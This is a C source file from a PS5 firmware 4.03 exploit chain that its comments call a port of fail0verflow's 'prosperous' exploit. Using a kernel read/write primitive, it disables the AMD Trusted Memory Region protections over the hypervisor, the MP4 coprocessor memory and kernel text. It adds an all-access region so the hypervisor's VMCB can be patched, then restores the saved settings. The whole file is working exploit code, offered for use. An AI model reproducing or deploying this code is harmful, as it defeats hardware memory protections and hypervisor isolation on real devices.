/*
 * TMR (Trusted Memory Region) bypass for PS5 FW 4.03.
 *
 * Ported from fail0verflow's prosperous exploit.
 *
 * TMRs are AMD hardware memory protection regions that restrict which
 * bus masters can access protected physical address ranges. The PS5 uses
 * them to protect:
 *   - Kernel text / HV text+data (TMR 16, 17, 18)
 *   - MP4 coprocessor DRAM (TMR 20)
 *   - PSP carveout (TMR 19)
 *   - HV master control (TMR 5)
 *
 * TMR registers are accessed indirectly via PCI B0:D18:F2 at offset
 * 0x80 (index) and 0x84 (data).
 *
 * IMPORTANT: This technique stops working at FW >= 5.00 because TMR
 * becomes non-modifiable by x86 at that point.
 */

#include <stdint.h>
#include <string.h>
#include <ps5/kernel.h>
#include "prosperous.h"

/* Saved TMR state for restoration */
static uint32_t saved_tmr5_cfg;
static uint32_t saved_tmr17_cfg;
static uint32_t saved_tmr18_cfg;
static uint32_t saved_tmr20_cfg;
static int tmr_saved = 0;

/* Read a 32-bit TMR indirect register */
static uint32_t tmr_read32(struct phys_rw_ctx *ctx, uint32_t addr)
{
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;
    uint32_t val;

    /* Write index register */
    kernel_copyin(&addr, ind_index_kva, sizeof(addr));

    /* Read data register */
    kernel_copyout(ind_data_kva, &val, sizeof(val));

    return val;
}

/* Write a 32-bit TMR indirect register */
static void tmr_write32(struct phys_rw_ctx *ctx, uint32_t addr, uint32_t val)
{
    uint64_t ind_index_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_INDEX_OFF;
    uint64_t ind_data_kva = ctx->dmap_base + PCI_B0D18F2 + TMR_IND_DATA_OFF;

    /* Write index register */
    kernel_copyin(&addr, ind_index_kva, sizeof(addr));

    /* Write data register */
    kernel_copyin(&val, ind_data_kva, sizeof(val));
}

/* Read a full TMR entry */
static void tmr_read_entry(struct phys_rw_ctx *ctx, int index, struct tmr_entry *entry)
{
    uint32_t base_addr = index * 0x10;
    entry->base = tmr_read32(ctx, base_addr);
    entry->limit = tmr_read32(ctx, base_addr + 4);
    entry->cfg = tmr_read32(ctx, base_addr + 8);
    entry->requestors = tmr_read32(ctx, base_addr + 12);
}

/* Configure a TMR entry to allow all requestors */
static void tmr_add_for_all(struct phys_rw_ctx *ctx, int index,
                            uint32_t base, uint32_t limit)
{
    uint32_t addr = index * 0x10;

    /* Disable first */
    tmr_write32(ctx, addr + 8, TMR_CFG_DISABLED);

    /* Set base and limit */
    tmr_write32(ctx, addr + 0, base);
    tmr_write32(ctx, addr + 4, limit);

    /* No requestor restrictions */
    tmr_write32(ctx, addr + 12, 0);

    /* Enable with all-access */
    tmr_write32(ctx, addr + 8, TMR_CFG_ALL_ACCESS);
}

/*
 * Phase 1: Disable TMR 20 (MP4 carveout) so x86 can write to MP4 DRAM.
 * Also create TMR 21 covering the TMR 16 region (kernel text) to
 * give all requestors access.
 */
int tmr_bypass_init(struct phys_rw_ctx *ctx)
{
    struct tmr_entry tmr16;

    /* Save TMR 20 config for later restoration */
    saved_tmr20_cfg = tmr_read32(ctx, 20 * 0x10 + 8);

    /* Disable TMR 20 so x86 can access MP4 DRAM (0x60000000-0x605f0000) */
    tmr_write32(ctx, 20 * 0x10 + 8, TMR_CFG_DISABLED);

    /* Read TMR 16 (kernel text / HV text+data protection) */
    tmr_read_entry(ctx, 16, &tmr16);

    /* Create TMR 21 covering the same region but allowing all access */
    tmr_add_for_all(ctx, 21, tmr16.base, tmr16.limit);

    tmr_saved = 1;
    return 0;
}

/*
 * Phase 2: Disable TMR protections on the HV memory region.
 *
 * TMR 5 is the master HV protection TMR. We temporarily set it to
 * all-access mode, then disable TMR 17 and 18 (HV region protections),
 * and finally disable TMR 5 entirely.
 *
 * This gives us unrestricted access to the HV's physical memory,
 * which is needed for VMCB patching.
 */
int tmr_disable_hv_regions(struct phys_rw_ctx *ctx)
{
    /* Save current TMR configs */
    saved_tmr5_cfg = tmr_read32(ctx, 5 * 0x10 + 8);
    saved_tmr17_cfg = tmr_read32(ctx, 17 * 0x10 + 8);
    saved_tmr18_cfg = tmr_read32(ctx, 18 * 0x10 + 8);

    /* Only proceed if TMR 5 is actually enabled */
    if (saved_tmr5_cfg == 0)
        return 0; /* Already disabled */

    /* Step 1: Set TMR 5 to all-access (so we can modify 17/18) */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_ALL_ACCESS);

    /* Step 2: Disable TMR 17 and 18 */
    tmr_write32(ctx, 17 * 0x10 + 8, TMR_CFG_DISABLED);
    tmr_write32(ctx, 18 * 0x10 + 8, TMR_CFG_DISABLED);

    /* Step 3: Disable TMR 5 */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_DISABLED);

    return 0;
}

/*
 * Restore TMR protections.
 *
 * Must be called after VMCB patching is complete. Re-enables the HV
 * TMR protections and restores TMR 20 (MP4 carveout) to prevent
 * kernel panics when game processes are restarted.
 */
void tmr_restore_hv_regions(struct phys_rw_ctx *ctx)
{
    if (!tmr_saved)
        return;

    /* Restore HV TMR protections in reverse order */
    tmr_write32(ctx, 5 * 0x10 + 8, TMR_CFG_ALL_ACCESS);
    tmr_write32(ctx, 17 * 0x10 + 8, saved_tmr17_cfg);
    tmr_write32(ctx, 18 * 0x10 + 8, saved_tmr18_cfg);
    tmr_write32(ctx, 5 * 0x10 + 8, saved_tmr5_cfg);

    /* Restore TMR 20 (critical: without this, kernel panics on game restart) */
    tmr_write32(ctx, 20 * 0x10 + 8, saved_tmr20_cfg);

    tmr_saved = 0;
}
